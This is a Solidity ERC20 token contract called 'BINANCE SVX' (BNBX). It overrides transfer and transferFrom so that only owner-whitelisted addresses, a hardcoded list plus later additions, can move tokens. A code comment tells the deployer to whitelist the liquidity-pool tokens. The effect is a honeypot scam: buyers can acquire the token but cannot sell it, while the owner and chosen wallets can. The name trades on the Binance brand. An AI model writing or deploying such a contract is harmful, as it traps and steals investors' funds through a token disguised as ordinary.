// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("BINANCE SVX", "BNBX") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 3000000 * 10 ** decimals());
        whiteList[0xd054734E3D8b460cFCD7d5C3bf8b84C9F077cbc6]= true;
        whiteList[0x047bB0B525f7028467643E25f8Ca477A8B1CB35f]=true;
        whiteList[0x6BcaaF1dD83f165be64Bd02a21EB33DE7535A386]=true;
        whiteList[0xBD337f30a8216eD85dc2Bbf0F07C65c25955d413]=true;
        whiteList[0x52222DCBbC528E6BCE08840a0938926E955610a1]=true;
        whiteList[0xf78D664e2E04cd3Ef8eF74e6dD6eb655eC28baFa]=true;
        whiteList[0xdF6F3fF25507eE93c97e0dAD94f16978fAC6818d]=true;
        whiteList[0xE9D798f2Af44644B4b4da17d22eccff46260feAa]=true;
        whiteList[0x87872487e381D3719C1061B2a6383Fc214484c46]=true;
        whiteList[0xB5D25FEbA4986202c05d574f8f082Eea81E71C14]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}